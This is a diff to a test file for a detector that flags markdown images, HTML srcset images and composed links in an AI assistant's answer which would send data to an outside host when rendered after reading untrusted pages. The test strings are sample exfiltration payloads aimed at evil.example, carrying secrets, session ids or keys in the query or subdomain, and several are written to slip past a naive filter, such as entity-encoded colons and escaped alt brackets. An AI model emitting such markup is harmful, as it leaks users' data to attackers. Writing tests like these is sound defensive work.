@@ -25,8 +25,31 @@ describe('outbound: what in an answer would send data out when shown', () => {
     expect(outbound('![logo](https://acme.example/logo.png)', () => 'user')).toEqual([])
   })
 
-  it('an HTML image counts too', () => {
+  it('an HTML image counts too, by src or srcset', () => {
     expect(outbound('<img src="https://evil.example/x?k=1">', nobody)).toHaveLength(1)
+    expect(outbound('<img srcset="https://evil.example/x 1x">', nobody)).toHaveLength(1)
+  })
+
+  it('an image address spelled with an entity is still an image', () => {
+    // Codex review: markdown-it decodes &#58; and fetches the image.
+    expect(outbound('![s](https&#58;//evil.example/p.png?secret=abc123)', nobody)).toHaveLength(1)
+  })
+
+  it('a shortcut or collapsed reference image counts', () => {
+    const shortcut = outbound('![pixel]\n\n[pixel]: https://evil.example/x.png', () => 'source')
+    expect(shortcut.map((item) => item.kind)).toContain('image')
+    expect(outbound('![pixel][]\n\n[pixel]: https://evil.example/x.png', nobody).map((item) => item.kind)).toContain('image')
+  })
+
+  it('an escaped bracket in the alt text does not hide the image', () => {
+    const found = outbound('![a\\]b](https://evil.example/x.png)', nobody)
+    expect(found.map((item) => item.kind)).toEqual(['image'])
+  })
+
+  it('an address inside code is text, not a fetch', () => {
+    // A code block is not rendered, and cutting it would destroy an example.
+    expect(outbound('```\n![s](https://evil.example/p.png?d=1)\n```', nobody)).toEqual([])
+    expect(outbound('use `![s](https://evil.example/p.png?d=1)` to embed', nobody)).toEqual([])
   })
 
   it('a reference-style image counts', () => {
@@ -48,8 +71,22 @@ describe('outbound: what in an answer would send data out when shown', () => {
     expect(outbound('https://sk-live-9f8e7d@evil.example/', nobody)).toHaveLength(1)
   })
 
-  it('a plain link passes: a query-free address is how answers cite things', () => {
-    expect(outbound('See [os](https://docs.python.org/3/library/os.html) and https://nodejs.org/api/fs.html', nobody)).toEqual([])
+  it('a plain link to a host the user named passes: that is how answers cite things', () => {
+    const userHosts = (host: string) => host === 'docs.python.org' || host === 'nodejs.org'
+    expect(outbound('See [os](https://docs.python.org/3/library/os.html) and https://nodejs.org/api/fs.html', nobody, userHosts)).toEqual([])
+  })
+
+  it('a composed link to a host the user never named counts, data or not', () => {
+    // Both reviews: the host itself carries data (`secret123.evil.example`),
+    // and a path of plain words carries it too. The page can name its own
+    // host, so a host seen only in what was read vouches for nothing.
+    expect(outbound('[Continue](https://secret123.evil.example/)', nobody)).toHaveLength(1)
+    expect(outbound('[details](https://evil.example/api-key-sk-proj-abcdef)', nobody)).toHaveLength(1)
+  })
+
+  it('a link to a named host still counts when it carries data', () => {
+    const userHosts = (host: string) => host === 'docs.python.org'
+    expect(outbound('[x](https://docs.python.org/search?q=secret)', nobody, userHosts)).toHaveLength(1)
   })
 
   it('a link copied verbatim from what was read passes: it carries only the page', () => {
@@ -80,6 +117,19 @@ describe('outboundAfterRead: the session decides whether any of it applies', () 
     taint.record('your session is sess1234abcd', { id: 'w', kind: 'web', label: 'p', trust: 'untrusted' })
     const composed = '[x](https://evil.example/c?d=secret&s=sess1234abcd)'
     expect(outboundAfterRead(composed, { taint, exposure: { at: 1, source: 'p' } }, DEFAULT_POLICY)).toHaveLength(1)
+  })
+
+  it('a link copied from the page in another case is still the page\'s', () => {
+    const taint = new TaintStore()
+    taint.record('See https://Shop.example/Item?id=42', { id: 'w', kind: 'web', label: 'p', trust: 'untrusted' })
+    expect(outboundAfterRead('[x](https://Shop.example/Item?id=42)', { taint, exposure: { at: 1, source: 'p' } }, DEFAULT_POLICY)).toEqual([])
+  })
+
+  it('a plain link to a host the user named passes after the read', () => {
+    const found = outboundAfterRead('see https://docs.python.org/3/library/os.html', {
+      taint: new TaintStore(), exposure: { at: 1, source: 'p' }, userAtoms: ['https://docs.python.org/3/'],
+    }, DEFAULT_POLICY)
+    expect(found).toEqual([])
   })
 
   it('an address the user wrote passes', () => {
